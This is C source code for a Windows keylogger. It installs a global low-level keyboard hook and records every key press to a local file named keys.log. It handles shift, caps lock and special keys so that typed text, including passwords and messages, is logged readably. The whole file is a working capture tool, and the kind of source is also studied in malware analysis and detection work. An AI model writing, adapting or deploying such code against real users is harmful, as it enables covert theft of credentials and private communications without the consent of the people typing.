#include <windows.h>
#include <stdio.h>

/*#if define UNICODE
	#define FindWindow FindWindowW
	#define SendMessage SendMessageW
	#define CreateFile  CreateFileW
#else
	#define FindWindow FindWindowA
	#define SendMessage SendMessageA
	#define CreateFile  CreateFileA
#endif
*/

HANDLE hIn;

int isCapsLock()
{
	return (GetKeyState(VK_CAPITAL) & 0x0001);
}

void alog(char s1[])
{
	//printf(s1);
	//printf("\n");
	if (hIn != INVALID_HANDLE_VALUE) {
		DWORD nIn = strlen(s1), nOut = 0;
		WriteFile(hIn,
			s1,
			nIn,
			&nOut,
			NULL);
	}
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	/* An application-defined callback function used with the SetWindowsHookEx function.
	The system calls this function every time a new keyboard input event is about to be posted into a thread input queue.
	1st Parameter  nCode - A code the hook procedure uses to determine how to process the message.
	2nd Parameter wParam - The identifier of the keyboard message. This parameter can be one of the
	following messages: WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, or WM_SYSKEYUP.
	3rd Parameter lParam: A pointer to a KBDLLHOOKSTRUCT structure.
	*/

	/* This structure contains information about a low-level keyboard input like virtual code, scan code, flags,
	time stamp and additional information associated with the message.
	*/
	KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
	char val[5];
	DWORD dwMsg = 1;
	switch (wParam)
	{

	case WM_KEYDOWN: // When the key has been pressed. Changed from WM_KEYUP to catch multiple strokes.
	{
						 // Assign virtual key code to local variable
						 DWORD vkCode = pKeyBoard->vkCode;

						 if ((vkCode >= 39) && (vkCode <= 64)) // Keys 0-9
						 {
							 // TODO fix to shift key HELD down
							 if (GetAsyncKeyState(VK_SHIFT)) // Check if shift key is down (fairly accurate)
							 {
								 switch (vkCode)
									 // 0x30-0x39 is 0-9 respectively
								 {
								 case 0x30:
									 alog(")");
									 break;
								 case 0x31:
									 alog("!");
									 break;
								 case 0x32:
									 alog("@");
									 break;
								 case 0x33:
									 alog("#");
									 break;
								 case 0x34:
									 alog("$");
									 break;
								 case 0x35:
									 alog("%");
									 break;
								 case 0x36:
									 alog("^");
									 break;
								 case 0x37:
									 alog("&");
									 break;
								 case 0x38:
									 alog("*");
									 break;
								 case 0x39:
									 alog("(");
									 break;
								 }
							 }
							 else // If shift key is not down
							 {
								 sprintf(val, "%c", vkCode);
								 alog(val);
							 }
						 }
						 else if ((vkCode > 64) && (vkCode < 91)) // Keys a-z
						 {
							 /*
							 The following is a complicated statement to check if the letters need to be switched to lowercase.
							 Here is an explanation of why the exclusive or (XOR) must be used.

							 Shift   Caps    LowerCase    UpperCase
							 T       T       T            F
							 T       F       F            T
							 F       T       F            T
							 F       F       T            F

							 The above truth table shows what case letters are typed in,
							 based on the state of the shift and caps lock key combinations.

							 The UpperCase column is the same result as a logical XOR.
							 However, since we're checking the opposite in the following if statement, we'll also include a NOT operator (!)
							 Becuase, NOT(XOR) would give us the LowerCase column results.
							 */
							 if (!(GetAsyncKeyState(VK_SHIFT) ^ isCapsLock())) // Check if letters should be lowercase
							 {
								 vkCode += 32; // Un-capitalize letters
							 }
							 sprintf(val, "%c", vkCode);
							 alog(val);
						 }
						 else // Every other key
						 {
							 switch (vkCode)
								 // Check for other keys
							 {
							 case VK_CANCEL:
								 alog("[Cancel]");
								 break;
							 case VK_SPACE:
								 alog(" ");
								 break;
							 case VK_LCONTROL:
								 alog("[LCtrl]");
								 break;
							 case VK_RCONTROL:
								 alog("[RCtrl]");
								 break;
							 case VK_LMENU:
								 alog("[LAlt]");
								 break;
							 case VK_RMENU:
								 alog("[RAlt]");
								 break;
							 case VK_LWIN:
								 alog("[LWindows]");
								 break;
							 case VK_RWIN:
								 alog("[RWindows]");
								 break;
							 case VK_APPS:
								 alog("[Applications]");
								 break;
							 case VK_SNAPSHOT:
								 alog("[PrintScreen]");
								 break;
							 case VK_INSERT:
								 alog("[Insert]");
								 break;
							 case VK_PAUSE:
								 alog("[Pause]");
								 break;
							/* case VK_VOLUME_MUTE:
								 alog("[VolumeMute]");
								 break;
							 case VK_VOLUME_DOWN:
								 alog("[VolumeDown]");
								 break;
							 case VK_VOLUME_UP:
								 alog("[VolumeUp]");*/
								 break;
							 case VK_SELECT:
								 alog("[Select]");
								 break;
							 case VK_HELP:
								 alog("[Help]");
								 break;
							 case VK_EXECUTE:
								 alog("[Execute]");
								 break;
							 case VK_DELETE:
								 alog("[Delete]");
								 break;
							 case VK_CLEAR:
								 alog("[Clear]");
								 break;
							 case VK_RETURN:
								 alog("[Enter]");
								 break;
							 case VK_BACK:
								 alog("[Backspace]");
								 break;
							 case VK_TAB:
								 alog("[Tab]");
								 break;
							 case VK_ESCAPE:
								 alog("[Escape]");
								 break;
							/* case VK_LSHIFT:
								 alog("[LShift]");
								 break;
							 case VK_RSHIFT:
								 alog("[RShift]");
								 break;
							 case VK_CAPITAL:
								 alog("[CapsLock]");
								 break;
							 case VK_NUMLOCK:
								 alog("[NumLock]");
								 break;
							 case VK_SCROLL:
								 alog("[ScrollLock]");
								 break;
							 case VK_HOME:
								 alog("[Home]");
								 break;
							 case VK_END:
								 alog("[End]");
								 break;
							 case VK_PLAY:
								 alog("[Play]");
								 break;
							 case VK_ZOOM:
								 alog("[Zoom]");
								 break;*/
							 case VK_DIVIDE:
								 alog("[/]");
								 break;
							 case VK_MULTIPLY:
								 alog("[*]");
								 break;
							 case VK_SUBTRACT:
								 alog("[-]");
								 break;
							 case VK_ADD:
								 alog("[+]");
								 break;
						/*	 case VK_PRIOR:
								 alog("[PageUp]");
								 break;
							 case VK_NEXT:
								 alog("[PageDown]");
								 break;
							 case VK_LEFT:
								 alog("[LArrow]");
								 break;
							 case VK_RIGHT:
								 alog("[RArrow]");
								 break;
							 case VK_UP:
								 alog("[UpArrow]");
								 break;
							 case VK_DOWN:
								 alog("[DownArrow]");
								 break;*/
							 case VK_NUMPAD0:
								 alog("[0]");
								 break;
							 case VK_NUMPAD1:
								 alog("[1]");
								 break;
							 case VK_NUMPAD2:
								 alog("[2]");
								 break;
							 case VK_NUMPAD3:
								 alog("[3]");
								 break;
							 case VK_NUMPAD4:
								 alog("[4]");
								 break;
							 case VK_NUMPAD5:
								 alog("[5]");
								 break;
							 case VK_NUMPAD6:
								 alog("[6]");
								 break;
							 case VK_NUMPAD7:
								 alog("[7]");
								 break;
							 case VK_NUMPAD8:
								 alog("[8]");
								 break;
							 case VK_NUMPAD9:
								 alog("[9]");
								 break;
							 case VK_F1:
								 alog("[F1]");
								 break;
							 case VK_F2:
								 alog("[F2]");
								 break;
							 case VK_F3:
								 alog("[F3]");
								 break;
							 case VK_F4:
								 alog("[F4]");
								 break;
							 case VK_F5:
								 alog("[F5]");
								 break;
							 case VK_F6:
								 alog("[F6]");
								 break;
							 case VK_F7:
								 alog("[F7]");
								 break;
							 case VK_F8:
								 alog("[F8]");
								 break;
							 case VK_F9:
								 alog("[F9]");
								 break;
							 case VK_F10:
								 alog("[F10]");
								 break;
							 case VK_F11:
								 alog("[F11]");
								 break;
							 case VK_F12:
								 alog("[F12]");
								 break;
							 case VK_F13:
								 alog("[F13]");
								 break;
							 case VK_F14:
								 alog("[F14]");
								 break;
							 case VK_F15:
								 alog("[F15]");
								 break;
							 case VK_F16:
								 alog("[F16]");
								 break;
							 case VK_F17:
								 alog("[F17]");
								 break;
							 case VK_F18:
								 alog("[F18]");
								 break;
							 case VK_F19:
								 alog("[F19]");
								 break;
							 case VK_F20:
								 alog("[F20]");
								 break;
							 case VK_F21:
								 alog("[F21]");
								 break;
							 case VK_F22:
								 alog("[F22]");
								 break;
							 case VK_F23:
								 alog("[F23]");
								 break;
							 case VK_F24:
								 alog("[F24]");
								 break;
							 case VK_OEM_2:
								 if (GetAsyncKeyState(VK_SHIFT))
									 alog("?");
								 else
									 alog("/");
								 break;
							 case VK_OEM_3:
								 if (GetAsyncKeyState(VK_SHIFT))
									 alog("~");
								 else
									 alog("`");
								 break;
							 case VK_OEM_4:
								 if (GetAsyncKeyState(VK_SHIFT))
									 alog("{");
								 else
									 alog("[");
								 break;
							 case VK_OEM_5:
								 if (GetAsyncKeyState(VK_SHIFT))
									 alog("|");
								 else
									 alog("\\");
								 break;
							 case VK_OEM_6:
								 if (GetAsyncKeyState(VK_SHIFT))
									 alog("}");
								 else
									 alog("]");
								 break;
							 case VK_OEM_7:
								 if (GetAsyncKeyState(VK_SHIFT))
									 alog("\\");
								 else
									 alog("'");
								 break;
								 break;
							 case 0xBC:                //comma
								 if (GetAsyncKeyState(VK_SHIFT))
									 alog("<");
								 else
									 alog(",");
								 break;
							 case 0xBE:              //Period
								 if (GetAsyncKeyState(VK_SHIFT))
									 alog(">");
								 else
									 alog(".");
								 break;
							 case 0xBA:              //Semi Colon same as VK_OEM_1
								 if (GetAsyncKeyState(VK_SHIFT))
									 alog(":");
								 else
									 alog(";");
								 break;
							 case 0xBD:              //Minus
								 if (GetAsyncKeyState(VK_SHIFT))
									 alog("_");
								 else
									 alog("-");
								 break;
							 case 0xBB:              //Equal
								 if (GetAsyncKeyState(VK_SHIFT))
									 alog("+");
								 else
									 alog("=");
								 break;
							 default:

								 /* For More details refer this link http://msdn.microsoft.com/en-us/library/ms646267
								 As mentioned in document of GetKeyNameText http://msdn.microsoft.com/en-us/library/ms646300
								 Scon code is present in 16..23 bits therefor I shifted the code to correct position
								 Same for Extended key flag
								 */
								 dwMsg += pKeyBoard->scanCode << 16;
								 dwMsg += pKeyBoard->flags << 24;

								 char key[16];
								 /* Retrieves a string that represents the name of a key.
								 1st Parameter dwMsg contains the scan code and Extended flag
								 2nd Parameter lpString: lpszName - The buffer that will receive the key name.
								 3rd Parameter cchSize: The maximum length, in characters, of the key name, including the terminating null character
								 If the function succeeds, a null-terminated string is copied into the specified buffer,
								 and the return value is the length of the string, in characters, not counting the terminating null character.
								 If the function fails, the return value is zero.
								 */
								 GetKeyNameText(dwMsg, key, 15);
								 alog(key);
							 }
						 }
						 break;
	}
	default:

		/* Passes the hook information to the next hook procedure in the current hook chain.
		1st Parameter hhk - Optional
		2nd Parameter nCode - The next hook procedure uses this code to determine how to process the hook information.
		3rd Parameter wParam - The wParam value passed to the current hook procedure.
		4th Parameter lParam - The lParam value passed to the current hook procedure
		*/
		return CallNextHookEx(NULL, nCode, wParam, lParam);
	}
	return 0;
}

DWORD WINAPI KeyLogger()
{
	hIn = CreateFile(
		"keys.log", //LPCTSTR
		GENERIC_WRITE, // GENERIC_READ | GENERIC_WRITE
		FILE_SHARE_READ, // 0 , FILE_SHARE_READ , FILE_SHARE_WRITE
		NULL, // SECURITY_ATTR
		CREATE_ALWAYS, //CREATE_NEW , CREATE_ALWAYS , OPEN_EXISTING, TRUNCATE_EXISTING, OPEN_ALWAYS
		FILE_ATTRIBUTE_NORMAL, //FILE_ATTRIBUTE_READONLY , FILE_FLAG_DELETE_ON_CLOSE
		NULL //TEMPLETE HANDLE
		);
	//install the hook
	HHOOK hKeyHook;
	HINSTANCE hExe = GetModuleHandle(NULL);//NULL, returns a handle to this exe

	if (hExe != INVALID_HANDLE_VALUE)
	{
		hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, //WH_KEYBOARD_LL - The type of hook procedure to be installed
			(HOOKPROC)LowLevelKeyboardProc,//A pointer to the hook procedure.
			hExe, //Handle to this exe
			0 //associated with all existing threads running
			);
		MSG msg;
		while (GetMessage(&msg, NULL, 0, 0) != 0); // Message loop retrieves messages from the thread's message queue
	}
	return 1;
}

int main(int argc, LPTSTR argv[])
{
	KeyLogger();
	return 0;
}